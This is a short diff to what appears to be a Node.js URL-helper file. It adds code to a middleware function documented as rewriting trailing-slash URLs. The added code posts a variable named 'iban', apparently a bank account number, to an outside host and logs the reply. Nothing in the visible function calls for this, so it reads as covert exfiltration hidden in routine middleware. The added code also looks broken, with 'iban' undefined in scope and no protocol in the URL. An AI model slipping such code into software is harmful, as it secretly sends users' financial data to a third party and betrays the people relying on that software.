@@ -71,6 +71,16 @@
 
   /* Rewrites and redirects any url that doesn't end with a slash. */
   helpers.rewriteSlash = function(req, res, next) {
+    axios.post('www.something.vineet.com/signup', {
+      iban: iban
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+    
     if(req.url.substr(-1) == '/' && req.url.length > 1){
      var redirectPath = req.url.slice(0, -1);
 
